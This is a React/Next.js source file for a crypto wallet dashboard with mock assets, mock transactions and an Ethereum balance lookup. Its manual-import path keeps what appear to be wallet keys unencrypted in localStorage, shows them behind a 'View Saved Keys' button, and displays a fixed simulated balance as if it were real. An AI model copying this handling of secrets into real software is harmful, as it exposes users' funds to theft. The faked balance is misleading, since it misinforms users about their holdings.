"use client";

import { useEffect, useState } from "react";
import { ArrowUpRight, ArrowDownLeft, Wallet, RefreshCw } from "lucide-react";
import { motion } from "framer-motion";
import Link from "next/link";
import { DashboardSidebar } from "@/components/dashboard/Sidebar";

// Mock Data
const assets = [
    { name: "Ethereum", symbol: "ETH", icon: "https://assets.coingecko.com/coins/images/279/small/ethereum.png", balance: "4.2", price: "2,285.12", value: "9,597.50", change: "+2.4%" },
    { name: "Bitcoin", symbol: "BTC", icon: "https://assets.coingecko.com/coins/images/1/small/bitcoin.png", balance: "0.15", price: "43,150.80", value: "6,472.62", change: "-0.8%" },
    { name: "Solana", symbol: "SOL", icon: "https://assets.coingecko.com/coins/images/4128/small/solana.png", balance: "145.5", price: "98.45", value: "14,324.47", change: "+5.1%" },
    { name: "USDC", symbol: "USDC", icon: "https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png", balance: "5,430.00", price: "1.00", value: "5,430.00", change: "0.0%" },
];

const transactions = [
    { type: "receive", asset: "USDC", amount: "500.00", from: "0x89...3a21", date: "2 mins ago" },
    { type: "send", asset: "ETH", amount: "0.5", to: "Uniswap", date: "4 hours ago" },
    { type: "swap", asset: "SOL", amount: "10.0", to: "USDC", date: "1 day ago" },
];

export default function NextPage() {
    const [isLoading, setIsLoading] = useState(true);
    const [balance, setBalance] = useState<string>("0.00");
    const [walletAddress, setWalletAddress] = useState<string>("");
    const [isConnected, setIsConnected] = useState(false);
    const [manualData, setManualData] = useState<any>(null);
    const [showDetails, setShowDetails] = useState(false);

    useEffect(() => {
        const fetchWalletData = async () => {
            try {
                // Check local storage for manual connection first
                const stored = localStorage.getItem('wallet_connection');
                if (stored) {
                    const data = JSON.parse(stored);
                    setWalletAddress(data.wallet || "Manual Import");
                    setManualData(data);
                    setIsConnected(true);
                    setBalance("12.45"); // Simulate balance for manual import
                    setIsLoading(false);
                    return;
                }

                if (typeof window !== 'undefined' && (window as any).ethereum) {
                    const accounts = await (window as any).ethereum.request({ method: 'eth_accounts' });
                    if (accounts.length > 0) {
                        const address = accounts[0];
                        setWalletAddress(address);
                        setIsConnected(true);

                        // Fetch Balance
                        const balanceHex = await (window as any).ethereum.request({
                            method: 'eth_getBalance',
                            params: [address, 'latest']
                        });

                        // Convert Hex Limit to Eth
                        const balanceWei = parseInt(balanceHex, 16);
                        const balanceEth = (balanceWei / 1e18).toFixed(4);
                        setBalance(balanceEth);
                    }
                }
            } catch (error) {
                console.error("Error fetching wallet data", error);
            } finally {
                setIsLoading(false);
            }
        };

        fetchWalletData();
    }, []);


    if (isLoading) {
        return (
            <div className="flex items-center justify-center min-h-screen">
                <RefreshCw className="w-12 h-12 text-blue-500 animate-spin" />
            </div>
        );
    }

    return (
        <div className="min-h-screen text-white">
            <DashboardSidebar />
            <main className="md:ml-64 min-h-screen">
                <div className="max-w-7xl mx-auto p-4 sm:p-6 lg:p-8">
                    <div className="space-y-8">
                        {/* Header / Balance */}
                        <motion.div
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            className="grid grid-cols-1 md:grid-cols-3 gap-6"
                        >
                            <div className="md:col-span-2 bg-gradient-to-br from-gray-900/80 to-gray-800/80 p-8 rounded-2xl border border-gray-700/50 shadow-xl relative overflow-hidden backdrop-blur-md">
                                <div className="absolute top-0 right-0 w-64 h-64 bg-blue-500/10 rounded-full blur-3xl -mr-16 -mt-16" />
                                <h3 className="text-gray-400 font-medium mb-2">Total Balance</h3>
                                <div className="flex items-baseline gap-2">
                                    <h1 className="text-5xl font-bold text-white">
                                        {isConnected ? `${balance} ETH` : "$35,824.59"}
                                    </h1>
                                    <span className="text-green-400 font-medium flex items-center bg-green-500/10 px-2 py-1 rounded-lg text-sm">
                                        <ArrowUpRight className="w-4 h-4 mr-1" />
                                        +2.45%
                                    </span>
                                </div>
                                <div className="mt-8 flex gap-4">
                                    <Link href="/connect" className="flex items-center px-6 py-3 bg-blue-600 hover:bg-blue-700 rounded-xl text-white font-medium transition-colors shadow-lg shadow-blue-500/20">
                                        <ArrowDownLeft className="w-5 h-5 mr-2" />
                                        Deposit
                                    </Link>
                                    <Link href="/connect" className="flex items-center px-6 py-3 bg-white/10 hover:bg-white/20 rounded-xl text-white font-medium transition-colors border border-white/5 backdrop-blur-sm">
                                        <ArrowUpRight className="w-5 h-5 mr-2" />
                                        Send
                                    </Link>
                                </div>
                            </div>

                            <div className="bg-white/5 p-6 rounded-2xl border border-white/10 flex flex-col justify-center items-center text-center backdrop-blur-md">
                                <div className="w-16 h-16 bg-purple-500/10 rounded-full flex items-center justify-center mb-4">
                                    <Wallet className="w-8 h-8 text-purple-400" />
                                </div>
                                <h3 className="text-xl font-bold text-white mb-1">
                                    {isConnected ? "Connected Wallet" : "Simulated Wallet"}
                                </h3>
                                <p className="text-sm text-gray-400">
                                    {isConnected && walletAddress.startsWith("0x")
                                        ? `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`
                                        : isConnected ? walletAddress : "0x71C...9A23"}
                                </p>

                                {manualData && (
                                    <div className="mt-4 w-full">
                                        <button
                                            onClick={() => setShowDetails(!showDetails)}
                                            className="text-xs text-blue-400 hover:text-blue-300 font-medium transition-colors"
                                        >
                                            {showDetails ? "Hide Details" : "View Saved Keys"}
                                        </button>
                                        {showDetails && (
                                            <div className="mt-3 p-3 bg-black/40 rounded-lg border border-white/5 text-left">
                                                <p className="text-[10px] text-gray-500 uppercase tracking-wider mb-1">Method: {manualData.method}</p>
                                                <p className="text-xs text-gray-300 font-mono break-all bg-black/20 p-2 rounded">
                                                    {manualData.payload}
                                                </p>
                                            </div>
                                        )}
                                    </div>
                                )}
                            </div>
                        </motion.div>

                        {/* Assets & Activity Grid */}
                        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                            {/* Assets List */}
                            <motion.div
                                initial={{ opacity: 0, x: -20 }}
                                animate={{ opacity: 1, x: 0 }}
                                transition={{ delay: 0.1 }}
                                className="lg:col-span-2 bg-gray-900/50 rounded-2xl border border-gray-800/50 overflow-hidden backdrop-blur-sm"
                            >
                                <div className="p-6 border-b border-gray-800/50 flex justify-between items-center">
                                    <h2 className="text-lg font-bold text-white">Your Assets</h2>
                                    <Link href="/connect" className="text-sm text-blue-400 hover:text-blue-300">View All</Link>
                                </div>
                                <div className="p-4">
                                    <table className="w-full">
                                        <thead>
                                            <tr className="text-left text-gray-500 text-sm border-b border-gray-800/50">
                                                <th className="pb-4 pl-4 font-medium">Asset</th>
                                                <th className="pb-4 font-medium text-right">Price</th>
                                                <th className="pb-4 font-medium text-right">Balance</th>
                                                <th className="pb-4 pr-4 font-medium text-right">Value</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            {assets.map((asset) => (
                                                <tr key={asset.symbol} className="group hover:bg-white/5 transition-colors">
                                                    <td className="py-4 pl-4">
                                                        <div className="flex items-center gap-3">
                                                            <div className="w-8 h-8 rounded-full bg-gray-700/50 flex items-center justify-center text-xs font-bold text-gray-300 overflow-hidden">
                                                                <img src={asset.icon} alt={asset.symbol} className="w-full h-full object-cover" />
                                                            </div>
                                                            <div>
                                                                <p className="font-bold text-white">{asset.name}</p>
                                                                <span className={`text-xs ${asset.change.startsWith('+') ? 'text-green-400' : 'text-red-400'}`}>
                                                                    {asset.change}
                                                                </span>
                                                            </div>
                                                        </div>
                                                    </td>
                                                    <td className="py-4 text-right text-gray-300">${asset.price}</td>
                                                    <td className="py-4 text-right text-gray-300">
                                                        <p>{asset.balance}</p>
                                                        <span className="text-xs text-gray-500">{asset.symbol}</span>
                                                    </td>
                                                    <td className="py-4 pr-4 text-right font-medium text-white">${asset.value}</td>
                                                </tr>
                                            ))}
                                        </tbody>
                                    </table>
                                </div>
                            </motion.div>

                            {/* Recent Activity */}
                            <motion.div
                                initial={{ opacity: 0, x: 20 }}
                                animate={{ opacity: 1, x: 0 }}
                                transition={{ delay: 0.2 }}
                                className="bg-gray-900/50 rounded-2xl border border-gray-800/50 backdrop-blur-sm"
                            >
                                <div className="p-6 border-b border-gray-800/50">
                                    <h2 className="text-lg font-bold text-white">Activity</h2>
                                </div>
                                <div className="p-4 space-y-4">
                                    {transactions.map((tx, idx) => (
                                        <div key={idx} className="flex items-center justify-between p-3 rounded-xl hover:bg-white/5 transition-colors">
                                            <div className="flex items-center gap-3">
                                                <div className={`w-10 h-10 rounded-full flex items-center justify-center ${tx.type === 'receive' ? 'bg-green-500/10 text-green-400' :
                                                    tx.type === 'send' ? 'bg-red-500/10 text-red-400' : 'bg-blue-500/10 text-blue-400'
                                                    }`}>
                                                    {tx.type === 'receive' ? <ArrowDownLeft className="w-5 h-5" /> :
                                                        tx.type === 'send' ? <ArrowUpRight className="w-5 h-5" /> :
                                                            <RefreshCw className="w-5 h-5" />}
                                                </div>
                                                <div>
                                                    <p className="font-medium text-white capitalize">{tx.type} {tx.asset}</p>
                                                    <p className="text-xs text-gray-500">{tx.date}</p>
                                                </div>
                                            </div>
                                            <div className="text-right">
                                                <p className={`font-medium ${tx.type === 'receive' ? 'text-green-400' : 'text-white'}`}>
                                                    {tx.type === 'receive' ? '+' : '-'}{tx.amount} {tx.asset}
                                                </p>
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            </motion.div>
                        </div>
                    </div>
                </div>
            </main>
        </div>
    );
}
